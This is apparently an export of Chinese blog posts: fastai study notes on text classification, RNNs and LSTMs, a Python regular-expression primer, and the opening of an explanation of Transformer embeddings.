href="#Text-generation" class="headerlink" title="Text generation"></a>Text generation</h2><p>先试试用上面的模型的预测下一个词的功能做个文本生成模型：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/318.png"><br>如您所见，我们添加了一些随机性（我们根据模型返回的概率选择一个随机词），因此我们不会得到完全相同的评论两次。我们的模型没有任何关于句子结构或语法规则的编程知识，但是它已经清楚地了解了很多英语句子：我们可以看到它适当地大写（我只是转换成I），因为我们的规则需要两个字符或更多的字来考虑一个词大写，所以它是正常的看到它小写）和使用一致的时态。总评乍一看是有道理的，只有仔细阅读，你才能注意到有些东西有点不对劲。对一个几个小时训练的模特来说还不错！但我们的最终目标不是训练一个模型来生成评论，而是对它们进行分类。。。所以让我们用这个模型来做。</p><h2 id="Creating-the-Classifier-DataLoaders"><a href="#Creating-the-Classifier-DataLoaders" class="headerlink" title="Creating the Classifier DataLoaders"></a>Creating the Classifier DataLoaders</h2><p>使用之前做好的语料库，因为语料库要是不同那之前的预训练就没有意义了<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/319.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/320.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/321.png"><br>不是语言模型了，现在是分类模型<br>分类模型文本不能像语言模型那样直接切割<br>fastai会把相似长度的文本放在同一个batch中，不同的长度再用padding补齐<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/322.png"><br>如用padding把所有都补成581<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/323.png"></p><h2 id="Fine-Tuning-the-Classifier"><a href="#Fine-Tuning-the-Classifier" class="headerlink" title="Fine-Tuning the Classifier"></a>Fine-Tuning the Classifier</h2><p>最后一步是以有区别的学习速度进行训练，并逐渐解冻。在计算机视觉中，我们经常一次解冻模型，但对于NLP分类器，我们发现一次解冻几层会产生真正的影响：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/324.png"><br>仅仅在一个epoch里，我们就得到了和我们在&lt;&gt;中训练一样的结果：还不错！我们可以通过-2冻结\，冻结除最后两个参数组以外的所有参数组：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/325.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/326.png"><br>我们的准确率达到了94.3%，这是三年前最先进的表现。通过对所有向后阅读的文本训练另一个模型并平均这两个模型的预测，我们甚至可以达到95.1%的准确率，这是ULMFiT论文介绍的最新技术。就在几个月前，通过微调一个更大的模型和使用昂贵的数据扩充技术（将句子翻译成另一种语言，然后使用另一种模型进行翻译），它才被打败。使用一个预先训练好的模型，让我们构建一个经过微调的语言模型，它非常强大，可以生成假评论，也可以帮助分类评论。这是令人兴奋的事情，但要记住，这项技术也可以用于恶意目的。</p><h2 id="文本的数据增强"><a href="#文本的数据增强" class="headerlink" title="文本的数据增强"></a>文本的数据增强</h2><p>arXiv查论文Unsupervised Data Augmentation for Consistency Training</p><h2 id="安全隐患"><a href="#安全隐患" class="headerlink" title="安全隐患"></a>安全隐患</h2><p>fast.ai搜SciPy Keynote</p><h1 id="NLP-drive"><a href="#NLP-drive" class="headerlink" title="NLP_drive"></a>NLP_drive</h1><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/327.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/328.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/329.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/330.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/331.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/332.png"></p><h2 id="Our-First-Language-Model-from-Scratch"><a href="#Our-First-Language-Model-from-Scratch" class="headerlink" title="Our First Language Model from Scratch"></a>Our First Language Model from Scratch</h2><p>把它变成神经网络的一个简单方法是指定我们要根据前面的三个单词来预测每个单词。我们可以创建一个由三个单词组成的每个序列的列表作为自变量，每个序列后面的下一个单词作为因变量。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/333.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/334.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/335.png"><br>我们现在可以创建一个神经网络结构，将三个单词作为输入，并返回对vocab中每个可能的下一个单词的概率的预测。我们将使用三个标准线性层，但是有两个调整。第一个调整是第一个线性层将只使用第一个单词的嵌入作为激活，第二个层将使用第二个单词的嵌入加上第一个层的输出激活，第三层将使用第三个单词的嵌入加上第二层的输出激活。这样做的关键效果是，每个单词都是在它前面的任何单词的信息上下文中解释的，第二个调整是这三个层中的每一层都将使用相同的权重矩阵。一个单词影响前一个单词激活的方式不应因单词的位置而改变。换言之，激活值将随着数据在层中的移动而改变，但层权重本身不会因层而异。因此，一个层不学习一个序列位置；它必须学会处理所有的位置，因为层的权重不会改变，你可能会认为连续的层是“同一层”的重复。事实上，PyTorch使这一点具体化；我们可以只创建一个层，然后多次使用它。</p><h2 id="Our-Language-Model-in-PyTorch"><a href="#Our-Language-Model-in-PyTorch" class="headerlink" title="Our Language Model in PyTorch"></a>Our Language Model in PyTorch</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/336.png"></p><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/337.png"><br>相同颜色代表是同一个权重矩阵（这里把Embedding换成linear就不行了，不知道为啥）</p><h3 id="为什么只有一个Embedding矩阵，明明有很多词？"><a href="#为什么只有一个Embedding矩阵，明明有很多词？" class="headerlink" title="为什么只有一个Embedding矩阵，明明有很多词？"></a>为什么只有一个Embedding矩阵，明明有很多词？</h3><p>因为概念上来讲它们都代表英语的内容词（不太懂）<br>我理解的是这个Embedding事实上包含了所有词的意义了已经，毕竟<img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/338.png"></p><h2 id="训练-2"><a href="#训练-2" class="headerlink" title="训练"></a>训练</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/339.png"></p><h3 id="baseline准确率"><a href="#baseline准确率" class="headerlink" title="baseline准确率"></a>baseline准确率</h3><p>thousand出现的概率最大，假设每次都预测是thousand，那准确率就是15%<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/340.png"></p><h2 id="Our-First-Recurrent-Neural-Network"><a href="#Our-First-Recurrent-Neural-Network" class="headerlink" title="Our First Recurrent Neural Network"></a>Our First Recurrent Neural Network</h2><p>看看我们模块的代码，我们可以通过用for循环替换调用层的重复代码来简化它。除了使我们的代码更简单之外，这还有一个好处，即我们能够将我们的模块同样好地应用于不同长度的令牌序列，而不局限于长度为3的令牌列表：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/341.png"><br>h初始化为0是因为0和张量相加时0会广播到张量的大小再相加，这是个很小巧的功能<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/342.png"><br>换张图说明RNN：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/343.png"></p><h2 id="Improving-the-RNN"><a href="#Improving-the-RNN" class="headerlink" title="Improving the RNN"></a>Improving the RNN</h2><h3 id="Maintaining-the-state-of-an-RNN"><a href="#Maintaining-the-state-of-an-RNN" class="headerlink" title="Maintaining the state of an RNN"></a>Maintaining the state of an RNN</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/344.png"><br>从开头计算所有的梯度会非常慢：<br>所以通过detach（）方法将计算好的梯度历史值丢掉<br>也就是说激活值依旧保留，但是梯度历史值没有保留<br>仔细想想，不管我们选择的序列长度是多少，这个模型都会有相同的激活，因为隐藏状态会记住上一批中的最后一个激活。唯一不同的是在每一步计算的梯度：它们将只在过去的序列长度标记上计算，而不是整个流。这就是为什么这个序列长度经常被称为bptt，以便通过时间进行反向传播。<br>有时候需要把h值置为0，所以加了reset函数<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/345.png"><br>注意：序号1代表分隔符‘.’<br>接下来划分batch<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/346.png"><br>创建训练集验证集<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/347.png"><br>在每个轮次开始的时候要调用reset（）把r置为0<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/348.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/349.png"><br>传入ModelRester到callbacks列表中（也就是cbs中<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/350.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/351.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/352.png"></p><h2 id="创造更多有效信息"><a href="#创造更多有效信息" class="headerlink" title="创造更多有效信息"></a>创造更多有效信息</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/353.png"><br>也就是在创建完每个隐藏状态后我们就立即进行了预测<br>在每次输入三个词之后因变量也变成三个词<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/354.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/355.png"><br>现在我们需要修改我们的模型，以便它在每个单词之后输出预测，而不是仅仅在三个单词序列的末尾：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/356.png"><br>此模型将返回形状bs x sl x vocab_sz的输出（因为我们在dim=1上叠加）。我们的目标形状是bs x sl，所以我们需要先将其展平，然后再将其用于F.cross：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/357.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/358.png"><br>我们需要训练更长的时间，因为任务已经改变了一点，现在更复杂了。但我们最终得到了一个好结果。。。至少，有时候。如果运行几次，就会发现在不同的运行中可以得到完全不同的结果。这是因为实际上我们这里有一个非常深的网络，可以产生非常大或非常小的梯度。我们将在本章的下一部分看到如何处理这个问题。现在，得到一个更好的模型的明显方法是更深入：在我们的基本RNN中，隐藏状态和输出激活之间只有一个线性层，所以也许我们可以用更多的方法得到更好的结果。</p><h2 id="加深层数"><a href="#加深层数" class="headerlink" title="加深层数"></a>加深层数</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/359.png"><br>注意：虚线和实线的权重是不同的<br>这个被称作是堆叠RNN或者多层RNN<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/360.png"><br>我们可以通过使用PyTorch的RNN类来节省一些时间，该类实现了我们之前创建的内容，但也为我们提供了堆叠多个RNN的选项，正如我们所讨论的：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/361.png"><br>其中n_layers设置了要堆叠多少个循环层<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/362.png"><br>现在真令人失望。。。我们以前的单层RNN性能更好。为什么？原因是我们有一个更深层次的模型，导致爆炸或消失激活。<br>在实践中，从这种RNN创建精确的模型是困难的。如果我们少调用detach，并且有更多的层，我们将获得更好的结果这将使我们的RNN有更长的时间范围可以学习，并且可以创建更丰富的特性。但这也意味着我们还有更深层的模式需要训练。深度学习发展的关键挑战在于如何训练这些模型。这之所以具有挑战性，是因为当你将一个矩阵乘以很多次时会发生什么。想想当你把一个数乘以很多次时会发生什么。例如，如果你乘以2，从1开始，你得到序列1，2，4，8，。。。经过32步，你已经是4294967296了。如果你乘以0.5，你会得到0.5，0.25，0.125…经过32步，你会得到0.00000000023。正如你所看到的，乘以一个比1稍高或稍低的数，在重复几次乘法之后，我们的起始数就会爆炸或消失。因为矩阵乘法只是将数字相乘并相加，重复的矩阵乘法也会发生同样的情况。这就是深层神经网络的全部——每一层都是另一个矩阵乘法。这意味着一个深度神经网络很容易以非常大或非常小的数字结束。这是一个问题，因为计算机存储数字（称为“浮点”）的方式意味着数字离零越远，它们的准确度就越低。&lt;&gt;中的图表来自一篇优秀的文章“您从未想了解浮点，但将被迫了解的内容”，它显示了浮点数的精度是如何随数字行而变化的。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/363.png"><br>这种不精确性意味着，对于深度网络，通常为更新权重而计算的梯度最终为零或无穷大。这通常被称为消失梯度或爆炸梯度问题。这意味着在SGD中，权重要么根本不更新，要么跳到无穷大。不管怎样，他们都不会随着训练而进步。研究人员已经开发了许多方法来解决这个问题，我们将在本书后面讨论。一种选择是改变层的定义，使其不太可能有爆炸性的激活。当我们讨论批处理规范化时，以及当我们讨论resnet时，我们将在&lt;。处理这个问题的另一个策略是小心初始化，这是我们将在&lt;&gt;中研究的主题。对于RNN，有两种类型的层经常被用来避免爆炸性激活：选通递归单元（GRU）和长-短期记忆（LSTM）层。这两个都可以在PyTorch中使用，并且是RNN层的直接替代品。在这本书中我们将只讨论LSTM；网上有很多很好的教程解释GRUs，它是LSTM设计的一个小变种。</p><h2 id="LSTM"><a href="#LSTM" class="headerlink" title="LSTM"></a>LSTM</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/364.png"><br>每一层里有微小的神经网络，用于决定保存多少历史状态，舍弃多少历史状态，添加多少种新状态<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/365.png"><br>实际上，我们可以重构代码。另外，在性能方面，一个大的矩阵乘法要比四个小的矩阵乘法好（这是因为我们只在GPU上启动一次特殊的fast内核，它让GPU有更多的并行工作要做）。堆叠需要一点时间（因为我们必须在GPU上移动一个张量，使其全部位于一个连续的数组中），所以我们使用两个单独的层作为输入和隐藏状态。经过优化和重构的代码如下所示：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/366.png"><br>其中chunk方法用于将数据等分<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/367.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/368.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/369.png"><br>fastai中查看激活值的方法：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/370.png"></p><h3 id="正则化-1"><a href="#正则化-1" class="headerlink" title="正则化"></a>正则化</h3><p>dropout对RNN非常有效<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/371.png"><br>如果没有在训练或者说正在验证，就无需dropout了<br>mask是一个伯努利概率<br>fastai中的每个module都自带training</p><h4 id="激活正则化和时间激活正则化"><a href="#激活正则化和时间激活正则化" class="headerlink" title="激活正则化和时间激活正则化"></a>激活正则化和时间激活正则化</h4><ul><li>降低权重</li><li>降低激活值</li></ul><p>激活正则化（AR）和时间激活正则化（TAR）是两种与权重衰减非常相似的正则化方法，在&lt;&gt;中讨论。当应用重量衰减时，我们对损失增加一个小的惩罚，目的是使重量尽可能小。对于激活正则化，它是由LSTM产生的最终激活，我们将尝试使其尽可能小，而不是权重。为了使最终激活规则化，我们必须将它们存储在某个地方，然后将它们的平方平均值添加到损失中（以及乘数alpha，这与重量衰减的wd类似）：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/372.png"><br>时间激活正则化与我们预测句子中的标记有关。这意味着，当我们按顺序阅读LSTMs的输出时，它们很可能在某种程度上是有意义的。TAR是为了鼓励这种行为，在损失中增加一个惩罚，使两个连续的激活之间的差异尽可能小：我们的激活张量有一个形状bs x sl x n\u hid，我们在序列长度轴（中间的维度）上读取连续的激活。由此，TAR可以表示为：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/373.png"><br>alpha和beta是两个需要调整的超参数。为了实现这一点，我们需要我们的dropout模型返回三个内容：正确的输出、LSTM pre dropout的激活和LSTM post dropout的激活。AR通常应用于退出激活（为了不惩罚我们后来变成零的激活），而TAR应用于非退出激活（因为那些零在两个连续的时间步之间产生了很大的差异）。然后有一个名为RNNRegularizer的回调，它将为我们应用这个正则化。</p><h3 id="权重栓连"><a href="#权重栓连" class="headerlink" title="权重栓连"></a>权重栓连</h3><p>预测的下一个单词与将激活值转变为英语单词有关。embedding实现了单词到激活值的转变，一个合理的假设就是这些都是基本相同的运算，或者至少说是顺序相反的，所以为什么不使用相同的权重呢。实际上确实可以这样，而且效果很好。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/374.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/375.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/376.png"><br>Now this is far better than our previous model!</p>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python正则表达式入门</title>
      <link href="/2021/07/27/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/"/>
      <url>/2021/07/27/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="引入模块"><a href="#引入模块" class="headerlink" title="引入模块"></a>引入模块</h2><p>import re</p><h2 id="编译正则表达式"><a href="#编译正则表达式" class="headerlink" title="编译正则表达式"></a>编译正则表达式</h2><p>m=re.compile(r’\d+’)</p><h2 id="使用正则表达式"><a href="#使用正则表达式" class="headerlink" title="使用正则表达式"></a>使用正则表达式</h2><h3 id="match（）"><a href="#match（）" class="headerlink" title="match（）"></a>match（）</h3><p>q=m.match(‘1833’)<br>q.span()<br>Out[42]: (0, 4)</p><h3 id="search（）"><a href="#search（）" class="headerlink" title="search（）"></a>search（）</h3><p>q=m.search(‘..1833’)<br>q.span()<br>Out[44]: (2, 6)</p><h1 id="编译标志"><a href="#编译标志" class="headerlink" title="编译标志"></a>编译标志</h1><p><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/0.png"><br>re.S  :让.可以匹配\n<br>re.I   :对大小写不敏感<br>re.M  :多行匹配，可以查找每一行的开头结尾<br>re.X  :当正则表达式是多行的时候，忽略其中的\n<br>​</p><h1 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h1><p>需要注意的是分组的findall（）会优先匹配分组内的内容，如<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/1.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/2.png"><br>用法：<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/3.png"><br>需要匹配绿框的形式，但是只想要src=后面的数据<br>这时就要用分组<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/4.png"><br>( )（？：）和（？=）的区别<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/5.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/6.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/7.png"></p><p><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/8.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/9.png"><br>补充：<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/10.png"></p><h2 id="取分组"><a href="#取分组" class="headerlink" title="取分组"></a>取分组</h2><p>每个分组都全替换，并且是最长替换（超出分组范围的贪婪的替换）<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/11.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/12.png"><br>只对第一个分组用全替换,第二个分组部分替换<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/13.png"><br>同理只对第二个分组用全替换,第一个分组部分替换<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/14.png"></p><h3 id="另外注意"><a href="#另外注意" class="headerlink" title="另外注意"></a>另外注意</h3><p>匹配完foob之后就只剩下ar了<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/15.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/16.png"></p><h2 id="对分组命名"><a href="#对分组命名" class="headerlink" title="对分组命名"></a>对分组命名</h2><p><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/17.png"><br>或<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/18.png"></p><h1 id="要求某个字符串中不能出现某个str"><a href="#要求某个字符串中不能出现某个str" class="headerlink" title="要求某个字符串中不能出现某个str"></a>要求某个字符串中不能出现某个str</h1><p>^((?!str).)*$<br>既有^又有$表示每个空字符的位置开始的检测都要满足该正则表达式<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/19.png"></p><h1 id="结合lambada表达式使用"><a href="#结合lambada表达式使用" class="headerlink" title="结合lambada表达式使用"></a>结合lambada表达式使用</h1><p><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/20.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">ret, key, value</span>):</span></span><br><span class="line">    ret[key] = value</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">&gt;&gt;string = <span class="string">&#x27;apple pear banana meat&#x27;</span></span><br><span class="line">&gt;&gt;ret = &#123;&#125;</span><br><span class="line">&gt;&gt;re.sub(<span class="string">r&#x27;(apple|banana)\s(\w+)\s?&#x27;</span>, <span class="keyword">lambda</span> x: func(ret, x.group(<span class="number">1</span>), x.group(<span class="number">2</span>)), string)       </span><br><span class="line">&gt;&gt;ret</span><br><span class="line">Out[<span class="number">35</span>]: &#123;<span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;pear&#x27;</span>, <span class="string">&#x27;banana&#x27;</span>: <span class="string">&#x27;meat&#x27;</span>&#125;</span><br><span class="line"><span class="comment">#首先用正则表达式去匹配string，把返回的结果传给lambada表达式处理</span></span><br></pre></td></tr></table></figure><h2 id="关于其中的group（）"><a href="#关于其中的group（）" class="headerlink" title="关于其中的group（）"></a>关于其中的group（）</h2><p><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/21.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/22.png"><br>可以看到group（0）和group（1）都是字符串元组<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/23.png"><br>group（1）取出了按空格划分的第一列（自动去掉了空格）<br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/24.png"><br><img src="http://106.12.125.218/medias/medias/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%85%A5%E9%97%A8/25.png"></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Transformer的理解</title>
      <link href="/2021/07/27/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/"/>
      <url>/2021/07/27/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="总的结构"><a href="#总的结构" class="headerlink" title="总的结构"></a>总的结构</h1><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/0.png"><br>其中每个Encoder的结构都是完全相同的但是参数不同<br>具体一点的图是这样的：<br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/1.png"></p><h1 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h1><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/2.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/3.png"></p><h2 id="什么是Embedding"><a href="#什么是Embedding" class="headerlink" title="什么是Embedding"></a>什么是Embedding</h2><blockquote><p>地图就是对于现实地理的embedding，现实的地理地形的信息其实远远超过三维 但是地图通过颜色和等高线等来最大化表现现实的地理信息。<br>词的embedding也就是用固定的维度来最大化表现词的信息</p></blockquote><h3 id="One-hot-represention"><a href="#One-hot-represention" class="headerlink" title="One hot represention"></a>One hot represention</h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/4.png" alt="3 封私信  12 条消息 什么是 word embedding - 知乎.png"></p><h3 id="Distributed-representation"><a href="#Distributed-representation" class="headerlink" title="Distributed representation"></a>Distributed representation</h3><p><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/5.png" alt="3 封私信  12 条消息 什么是 word embedding - 知乎.png"><br><img src="/medias/%E5%85%B3%E4%BA%8ETransformer%E7%9A%84%E7%90%86%E8%A7%A3/6.png" alt="3 封私信  12 条消息 什么是 word embedding - 知乎.png"><br>Word embedding也就是要达到第二个神经网络所表示的结果，降低训练所需要的数据量。 而上面的四个单词可以被拆成2个节点的是由我们人工提供的先验知识将原始的输入空间经过f(上 图中的黄色箭头)投射到了另一个空间(维度更小)，所以才能够降低训练所需要的数据量。但是我们没有办法一直人工提供，机器学习的宗旨就是让机器代替人力去发现pattern.</p><blockquote><p>Word embedding就是要从数据中自动学习到输入空间到Distributed representation空间的映射 f。</p></blockquote><h3 id="实例-那这两个单词都狗的品种名，而上下文的内容已经暗指了该单词具有可爱，会舔人的特点。"><a href="#实例-那这两个单词都狗的品种名，而上下文的内容已经暗指了该单词具有可爱，会舔人的特点。" class="headerlink" title="实例:那这两个单词都狗的品种名，而上下文的内容已经暗指了该单词具有可爱，会舔人的特点。"></a>实例:那这两个单词都狗的品种名，而上下文的内容已经暗指了该单词具有可爱，会舔人的特点。</h3><ul><li>这个可爱的泰迪舔了我的脸。 </li><li>这个可爱的 京巴舔了我的脸。 </li></ul><p>而从上面这个例子中我们就可以找到一个k:x-&gt;z:预测上下文。 用输入单词:作为中心单词去预测其他单词名出现在其周边的可能性。 我们既知道对应的z。而该任务k 又可以让 f()所转换得到的y的表达具有Distributed 